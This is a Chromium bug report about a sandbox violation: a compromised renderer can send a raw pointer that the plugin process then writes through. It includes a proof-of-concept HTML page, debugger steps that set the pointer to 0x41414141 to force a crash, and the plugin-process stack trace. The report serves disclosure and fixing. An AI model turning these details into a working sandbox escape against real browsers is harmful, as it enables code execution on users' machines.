<title>Issue 31880 -   chromium -    [MD audit] [plugins] Sandbox Violation: Raw pointer from renderer manipulated in plugin process - Project Hosting on Google Code</title> <pre> Reported by Mark Dowd    A compromised renderer can pass an arbitrary pointer to the plugin process;   this pointer is then dereferenced and manipulated (written) in the plugin   process. This could be used to corrupt the plugin process and execute   arbitrary code outside the sandbox.    Steps to reproduce:    1. Create a plugin.htm page with the following (this just loads the Acrobat   plugin so you can mess with it):    --  &lt;embed id=&quot;pdf&quot; type=&quot;application/pdf&quot; hidden=&quot;true&quot; width=&quot;0&quot; height=&quot;0&quot;&gt;  &lt;/embed&gt;  &lt;/body&gt;  &lt;script&gt;  var obj = document.getElementById(&quot;pdf&quot;);  var x = new Object();  obj.messageHandler = x;  &lt;/script&gt;  --    2. Set a breakpoint in the renderer process on   ParamTraits&lt;NPVariant_Param&gt;::Write().     3. Attach to the renderer process and load plugin.htm.    4. After breaking  change the value of p.type to 7 (which is   NPVARIANT_PARAM_OBJECT_POINTER; it should initially be 6  which is   NPVARIANT_PARAM_OBJECT_ROUTING_ID).    5. Change the value of p.npobject_pointer to 0x41414141 (or any garbage   value) to trigger a crash on a write violation in the plugin process.    The plugin process will read the supplied value with   ParamTraits&lt;NPVariant_Param&gt;::Read() and treat it as an NPObject pointer.   The reference count (address+4 on x86) is incremented shortly after   reading  which is why a crash occurs when an invalid address is provided.     The crashing stack in the plugin process looks like this:    chrome.dll!_NPN_RetainObject(NPObject * npObject=0x41414141)  Line 286	C++  chrome.dll!CreateNPVariant(const NPVariant_Param &amp; param={...}    PluginChannelBase * channel=0x00ce4280  _NPVariant * result=0x0027f01c  int   containing_window=0x002e0466  const GURL &amp; page_url={...})  Line 260 + 0x9   bytes	C++  chrome.dll!NPObjectStub::OnSetProperty(const NPIdentifier_Param &amp;   name={...}  const NPVariant_Param &amp; property={...}  IPC::Message *   reply_msg=class=0x00003fff  index=0x0003fff0)  Line 219 + 0x1d bytes	C++  chrome.dll!IPC::MessageWithReply&lt;Tuple2&lt;NPIdentifier_Param NPVariant_Param&gt;   Tuple1&lt;bool &amp;&gt; &gt;::DispatchDelayReply&lt;NPObjectStub void (__thiscall   NPObjectStub::*)(NPIdentifier_Param const &amp; NPVariant_Param const   &amp; IPC::Message *)&gt;(const IPC::Message * msg=class=0x00000001    index=0x00030005  NPObjectStub * obj=0x00cf1280  void (const   NPIdentifier_Param &amp;  const NPVariant_Param &amp;  IPC::Message *)*   func=0x6570bed0)  Line 1218 + 0x88 bytes	C++  chrome.dll!NPObjectStub::OnMessageReceived(const IPC::Message &amp;   msg=class=0x00000001  index=0x00030005)  Line 78 + 0x10 bytes	C++  chrome.dll!MessageRouter::RouteMessage(const IPC::Message &amp;   msg=class=0x00000001  index=0x00030005)  Line 40 + 0xa bytes	C++  chrome.dll!PluginChannelBase::OnMessageReceived(const IPC::Message &amp;   message=class=0x00000001  index=0x00030005)  Line 137	C++  chrome.dll!PluginChannel::OnMessageReceived(const IPC::Message &amp;   msg=class=...  index=...)  Line 199 + 0x8 bytes	C++  chrome.dll!MessageLoop::RunTask(Task * task=0x00000000)  Line 321	C++   </pre>